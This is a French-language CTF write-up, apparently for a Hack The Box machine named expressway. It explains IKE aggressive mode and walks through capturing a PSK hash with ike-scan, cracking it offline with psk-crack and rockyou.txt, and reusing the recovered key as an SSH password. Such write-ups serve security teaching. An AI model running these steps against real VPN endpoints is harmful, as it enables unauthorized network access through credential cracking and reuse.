# IKE/IPsec VPN

### <mark style="color:blue;">📚 Concepts fondamentaux</mark>

<mark style="color:orange;">**Qu'est-ce qu'IKE ?**</mark>

**IKE (Internet Key Exchange)** = protocole qui négocie les clés de chiffrement pour établir un tunnel VPN IPsec.

**Analogie simple :**

* **IKE** = La poignée de main secrète à l'entrée du club
* **IPsec** = Le club lui-même (tunnel chiffré)

<mark style="color:orange;">**Architecture IKE**</mark>

```
┌─────────────────────────────────────────┐
│          PHASE 1 : IKE SA               │
├─────────────────────────────────────────┤
│ • Authentification (PSK ou certificat) │
│ • Négociation des algorithmes          │
│ • Échange de clés Diffie-Hellman       │
│                                         │
│  Mode Principal (6 msgs) ← SÉCURISÉ    │
│  Mode Agressif (3 msgs) ← VULNÉRABLE   │
└─────────────────────────────────────────┘
                ↓
┌─────────────────────────────────────────┐
│         PHASE 2 : IPsec SA              │
├─────────────────────────────────────────┤
│ • Création du tunnel ESP/AH             │
│ • Dérivation des clés de session        │
└─────────────────────────────────────────┘
```

<mark style="color:orange;">**PSK (Pre-Shared Key)**</mark>

**Définition :** Secret partagé à l'avance entre le client et le serveur VPN (comme un mot de passe WiFi).

**Exemple :**

* Admin configure le serveur VPN : `PSK = SuperSecret2024!`
* Tous les clients doivent utiliser la même PSK pour se connecter

***

#### <mark style="color:blue;">🎯 Vulnérabilité : Mode Agressif (Aggressive Mode)</mark>

<mark style="color:orange;">**Différence Mode Principal vs Mode Agressif**</mark>

| Critère  | Mode Principal | Mode Agressif  |
| -------- | -------------- | -------------- |
| Messages | 6              | 3              |
| Vitesse  | Lent           | Rapide         |
| Identité | **Chiffrée**   | **En clair**   |
| Hash PSK | Protégé        | **Capturable** |
| Sécurité | ✅ Sécurisé     | ❌ Vulnérable   |

<mark style="color:orange;">**Pourquoi Mode Agressif est vulnérable ?**</mark>

En mode agressif, le serveur envoie :

1. **L'identité en clair** : `ike@expressway.htb`
2. **Un hash dérivé de la PSK** : `HASH = HMAC-SHA1(PSK, Ni | Nr | SA | IDi | IDr)`

**Ce hash contient :**

* `PSK` = la clé pré-partagée (ce qu'on cherche)
* `Ni`, `Nr` = nonces (valeurs aléatoires échangées)
* `SA` = algorithmes négociés
* `IDi`, `IDr` = identités client/serveur

🚨 **Impact :** Si on capture ce hash, on peut tester des PSK candidates **hors ligne** (comme cracker un hash MD5).

***

### <mark style="color:blue;">🔧 Exploitation avec ike-scan</mark>

**Installation**

```bash
# Debian/Ubuntu
sudo apt install -y ike-scan

# Compilation depuis les sources
git clone https://github.com/royhills/ike-scan.git
cd ike-scan
autoreconf --install
./configure --with-openssl
make -j$(nproc)
sudo make install
```

**Étape 1 : Scan initial (Mode Principal)**

```bash
sudo ike-scan <IP_CIBLE>
```

**Résultat typique :**

```
Main Mode Handshake returned 
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK)
VID=09002689dfd6b712 (XAUTH)
```

**Analyse :**

* `Enc=3DES` : Chiffrement faible (obsolète)
* `Hash=SHA1` : Fonction de hash faible
* `Group=2 (modp1024)` : Diffie-Hellman 1024-bit (faible)
* `Auth=PSK` : ✅ Utilise une PSK → **vecteur d'attaque !**
* `VID=...XAUTH` : Authentification en 2 étapes (PSK + login/password)

**Étape 2 : Forcer le Mode Agressif**

```bash
sudo ike-scan -A <IP_CIBLE>
```

**Résultat :**

```
Aggressive Mode Handshake returned
ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
Hash(20 bytes)
```

🎉 **Victoire !** On a récupéré :

* **Identité** : `ike@expressway.htb`
* **Hash** : 20 octets (HMAC-SHA1)

**Étape 3 : Capturer les données PSK**

```bash
sudo ike-scan -A <IP_CIBLE> --id=ike@expressway.htb -Pike.psk
```

**Options :**

* `-A` : Mode agressif
* `--id=ike@expressway.htb` : Spécifier l'identité trouvée
* `-Pike.psk` : Sauvegarder dans le fichier `ike.psk`

**Contenu du fichier ike.psk :**

```
g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r
                                              ^^^^^^
                                       Hash à cracker
```

Le dernier champ `hash_r` = `9157243c333a25d603bf588a5c8a9c0bc966e3b0`

***

### <mark style="color:blue;">CRACK THE HASH</mark>

#### <mark style="color:green;">🎯 Objectif</mark>

Retrouver la PSK en texte clair à partir du hash capturé.

#### <mark style="color:green;">🔧 Outil : psk-crack</mark>

**psk-crack** est livré avec `ike-scan` et fonctionne comme :

* **Hashcat** pour les hash de mots de passe
* **John the Ripper** pour les fichiers /etc/shadow

**Principe**

```
Pour chaque candidat dans rockyou.txt :
    1. Calculer HASH = HMAC-SHA1(candidat, Ni | Nr | SA | IDi | IDr)
    2. Comparer avec hash_r capturé
    3. Si match → PSK trouvée !
```

#### <mark style="color:green;">📋 Méthodologie</mark>

**Commande**

```bash
psk-crack -d ~/wordlists/rockyou.txt ike.psk
```

**Options :**

* `-d` : Mode dictionnaire (wordlist)
* `ike.psk` : Fichier contenant les paramètres IKE capturés

**Résultat**

```
Starting psk-crack [ike-scan 1.9.6]
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash 9157...
Ending psk-crack: 8045039 iterations in 4.278 seconds
```

✅ **PSK trouvée** : `freakingrockstarontheroad`

#### <mark style="color:green;">🚀 Exploitation post-PSK</mark>

**1. Connexion VPN IPsec**

Si XAUTH n'est pas activé, la PSK seule peut suffire pour établir un tunnel VPN.

```bash
# Avec strongSwan
sudo ipsec up <connexion>
```

**2. Réutilisation de mot de passe**

Tester la PSK comme mot de passe sur d'autres services :

```bash
# SSH
ssh ike@expressway.htb
# Password: freakingrockstarontheroad

# SMB
smbclient //expressway.htb/share -U ike
```

**3. Authentification XAUTH**

Si XAUTH est activé, la PSK + un couple login/password est nécessaire :

```bash
# Phase 1 : PSK validée ✅
# Phase 2 : Besoin de credentials XAUTH (bruteforce possible)
```

#### <mark style="color:green;">💡 Cas pratique du CTF</mark>

Dans l'exemple, après avoir trouvé la PSK `freakingrockstarontheroad`, elle a été réutilisée comme mot de passe SSH pour le compte `ike@expressway.htb` → **flag user.txt obtenu !**

***
